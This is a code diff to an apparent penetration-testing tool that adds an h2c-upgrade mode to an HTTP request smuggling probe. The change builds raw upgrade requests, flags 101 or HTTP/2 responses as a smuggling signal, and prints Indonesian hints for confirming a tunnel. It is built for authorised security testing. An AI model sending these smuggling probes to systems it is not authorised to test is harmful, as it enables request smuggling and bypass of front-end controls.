@@ -19,7 +19,7 @@
 
 import { targetAllowed, politeDelay } from "./security";
 
-export type SmuggleMode = "clte" | "tecl" | "teob";
+export type SmuggleMode = "clte" | "tecl" | "teob" | "h2c";
 
 export interface SmuggleTarget {
   host: string;
@@ -70,6 +70,19 @@ export function buildProbe(
   canary: string,
   teVariant = 0
 ): string {
+  if (mode === "h2c") {
+    // h2c downgrade (CWE-444 family): ask the EDGE to upgrade the back-end hop
+    // to h2c. If the edge forwards Upgrade/h2c and keeps speaking HTTP/1.1 to
+    // the client, later requests can be misattributed into the h2c stream.
+    // No hidden request here — the canary rides the VICTIM request instead.
+    return (
+      `GET ${path} HTTP/1.1\r\nHost: ${host}\r\n` +
+      `Connection: Upgrade, HTTP2-Settings\r\n` +
+      `Upgrade: h2c\r\n` +
+      `HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA\r\n` +
+      `\r\n`
+    );
+  }
   const hidden = `GET /${canary} HTTP/1.1\r\nHost: ${host}\r\nConnection: close\r\n\r\n`;
   if (mode === "tecl") {
     // Front uses TE (one request: chunk + terminator), back uses CL and stops
@@ -121,6 +134,16 @@ export function classifySmuggle(
   const canarySeen = canary ? text.includes(canary) : false;
   const firstLine = statuses.length ? (statuses[0] ?? "") : "";
   const first = firstLine ? Number((/HTTP\/1\.[01] (\d{3})/.exec(firstLine) || [])[1] || 0) : 0;
+  // h2c acceptance markers (used by the h2c mode): the edge/back-end accepted
+  // the h2c upgrade — tunneling surface, worth a SIGNAL even without canary.
+  // Anchored to the FIRST status line (101) or an HTTP/2 preface, so a plain
+  // body containing the number 101 can never fake it.
+  if (first === 101 || /PRI \* HTTP\/2\.0/.test(text) || /^HTTP\/2 /.test(text)) {
+    return {
+      verdict: "SIGNAL",
+      reason: "h2c upgrade DITERIMA (101/HTTP/2 frame) — kandidat h2c smuggling (CWE-444): uji manual pasangan front/back sebelum lapor.",
+    };
+  }
   if (canarySeen && statuses.length <= 2) {
     return {
       verdict: "CONFIRMED",
@@ -261,12 +284,12 @@ export async function smuggleProbe(
     return "Error: SCOPE — smuggle_probe hanya untuk lab / engagement aktif.";
   const t = parseSmuggleTarget(raw);
   if (!t) return "Error: URL tidak valid.";
-  const want = String(opts.modes || "clte,tecl,teob")
+  const want = String(opts.modes || "clte,tecl,teob,h2c")
     .split(",")
     .map((s) => s.trim().toLowerCase())
-    .filter((s): s is SmuggleMode => s === "clte" || s === "tecl" || s === "teob")
-    .slice(0, 3);
-  const modes: SmuggleMode[] = want.length ? want : ["clte", "tecl", "teob"];
+    .filter((s): s is SmuggleMode => s === "clte" || s === "tecl" || s === "teob" || s === "h2c")
+    .slice(0, 4);
+  const modes: SmuggleMode[] = want.length ? want : ["clte", "tecl", "teob", "h2c"];
   const teVariant = Math.max(
     0,
     Math.min(obfuscations().length - 1, Number(opts.te ?? 0) || 0)
@@ -288,6 +311,7 @@ export async function smuggleProbe(
     }
     const c = classifySmuggle(out, canary);
     if (c.verdict === "CONFIRMED") confirmed++;
+    if (mode === "h2c" && /h2c upgrade DITERIMA/.test(c.reason)) lines.push("  ⚠️ h2c: edge meneruskan Upgrade — kirim request berikutnya di koneksi yang sama; kalau dijawab HTTP/2 frame → tunneling terbuka.");
     const mark =
       c.verdict === "CONFIRMED" ? "✅" : c.verdict === "REJECTED" ? "🛡️" : c.verdict === "SIGNAL" ? "⚠️" : "➖";
     lines.push(`• [${mode}] ${mark} ${c.verdict} — ${c.reason}`);
